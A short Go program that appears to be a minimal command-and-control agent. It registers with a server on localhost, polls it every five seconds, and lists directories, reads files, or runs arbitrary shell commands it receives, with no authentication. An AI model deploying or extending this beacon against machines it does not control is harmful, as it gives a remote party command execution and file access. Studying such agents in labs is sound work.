package main

import (
    "bytes"
    "encoding/json"
    "io/ioutil"
    "net/http"
    "os/exec"
    "strings"
    "time"
)

var agentID string

func main() {
    // 1. Register
    resp, _ := http.Post("http://localhost:8080/register", "application/json", nil)
    var reg map[string]string
    json.NewDecoder(resp.Body).Decode(&reg)
    agentID = reg["id"]

    // 2. Poll Loop
    for {
        time.Sleep(5 * time.Second)
        payload, _ := json.Marshal(map[string]string{"id": agentID})
        resp, _ := http.Post("http://localhost:8080/poll", "application/json", bytes.NewBuffer(payload))
        
        var task map[string]string
        json.NewDecoder(resp.Body).Decode(&task)

        if task["cmd"] != "NONE" {
            execute(task["cmd"])
        }
    }
}

func execute(cmd string) {
    parts := strings.Split(cmd, " ")
    if parts[0] == "LIST" {
        files, _ := ioutil.ReadDir(parts[1])
        for _, f := range files {
            println(f.Name())
        }
    } else if parts[0] == "READ" {
        data, _ := ioutil.ReadFile(parts[1])
        println(string(data))
    } else {
        out, _ := exec.Command(parts[0], parts[1:]...).Output()
        println(string(out))
    }
}
